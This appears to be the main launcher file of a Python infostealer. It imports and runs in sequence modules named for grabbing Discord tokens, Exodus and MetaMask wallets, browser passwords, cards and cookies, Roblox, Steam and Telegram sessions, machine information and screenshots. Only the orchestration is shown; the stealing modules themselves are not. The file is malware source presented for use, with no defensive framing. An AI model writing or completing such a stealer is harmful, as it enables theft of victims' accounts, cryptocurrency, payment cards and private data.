from exodus import exo
from discord import find_tokens
from machine import machineinfo
from metamask import yea
from passwords_cards_cookies import mainpass
from roblox import rbxsteal
from screenshot import screen
from steam import steam_st
from telegram import telegram

def main(): # or u can create a CLASS in the scripts / here
  find_tokens()
  exo() 
  machineinfo()
  yea()
  mainpass()
  rbxsteal()
  screen()
  steam_st()
  telegram()
  
if __name__ == "__main__":
  main()
